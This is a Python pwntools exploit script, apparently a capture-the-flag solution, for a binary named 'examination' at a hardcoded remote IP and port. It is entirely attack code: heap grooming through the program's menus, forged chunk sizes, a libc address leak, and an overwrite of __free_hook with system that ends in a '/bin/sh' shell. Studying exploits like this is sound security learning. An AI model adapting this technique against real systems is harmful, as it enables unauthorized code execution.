#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = '124.70.130.92', 60001
binary = './examination'
brkpts = '''
c
'''

elf = ELF("examination")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8, chr(0)))

if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(remote_ip, port)
    context.noptrace = True

elif len(sys.argv) > 1:
    io = gdb.debug(binary, brkpts)

else:
    io = process(binary)

def role(idx):
    sla(">: ", str(idx))

def choice(idx):
    sla("choice>> ", str(idx))

def add_student(count):
    choice(1)
    sla("questions: ", str(count))

def give_score():
    choice(2)

def add_comment(idx, data, size = False):
    choice(3)
    sla("> ", str(idx))
    if size:
        sla("comment: ", str(size))
    sa("comment:", data)

def free_student(idx):
    choice(4)
    sla("choose?", str(idx))

def change_role(idx):
    choice(5)
    role(idx)

def get_reward(offset, no = True):
    choice(2)
    if no:
        reu("reward! ")
        leak = int(rl().strip(), 16)
        log.info("leak @ "+hex(leak))
        sla("addr: ", str(leak + offset) + "0")

def lazy():
    choice(3)

def set_mode(data = False, score = False):
    choice(4)
    if data:
        sa("mode!", data)
    else:
        sla("0 to 100", str(score))

def change_id(idx):
    choice(6)
    sla("id: ", str(idx))

if __name__ == "__main__":
    role(0)

    for _ in range(2):
        add_student(1)

    change_role(1)
    set_mode(data="b")
    lazy()

    change_role(0)
    give_score()
    add_comment(1, "tmp2", 0x3ff)

    change_role(0)

    for _ in range(2):
        add_student(1)

    change_role(1)
    set_mode(score = 0x60)

    lazy()
    set_mode(data = p64(0x441)*4)

    change_role(0)
    free_student(1)

    add_student(1)
    add_comment(2, "tmp2", 0x20)
    add_student(1)

    change_role(1)
    change_id(4)
    set_mode(data="b")

    change_role(0)
    add_comment(4, "/bin/sh\x00", 0x20)

    change_role(1)
    change_id(4)
    lazy()
    set_mode(score = 0x30)
    lazy()
    set_mode(p64(0x500))
    
    get_reward(0x10, no = False)

    reu("review:")
    re(0x31)
    libc.address = uu64(re(6)) - 0x1ecbe0
    log.info("libc @ "+hex(libc.address))
    free_hook = libc.symbols['__free_hook']
    system = libc.symbols['system']

    change_id(2)
    set_mode("a")
    lazy()
    set_mode(score = 0)
    lazy()
    set_mode(p64(free_hook))

    change_id(4)
    set_mode(p64(system))

    change_role(0)
    free_student(4)

    io.interactive()
